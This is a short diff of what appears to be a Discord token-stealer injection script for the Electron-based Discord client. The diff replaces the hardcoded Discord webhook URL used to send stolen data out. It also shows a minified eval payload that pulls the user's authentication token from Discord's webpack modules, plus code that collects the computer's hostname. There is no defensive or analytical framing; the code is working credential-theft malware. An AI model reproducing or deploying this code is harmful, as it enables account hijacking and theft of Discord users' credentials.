@@ -6,7 +6,7 @@ const {
 } = require('electron')
 const querystring = require('querystring');
 const os = require('os')
-var webhook = "https://discord.com/api/webhooks/1013554776518164481/BRHgCsT4FHtSFcbGmoZcMMbBYjQ7SYWBIA40SJhIERO5KvQ0Qk_92539q4a7OU3ei-hh";
+var webhook = "https://discord.com/api/webhooks/1013615961825349672/DB5ghZSu28EQiFvBIwttgKD_4loUxfjgGGqgg6vOkNnVUemG32kndVDRT6d26YCUi58S";
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
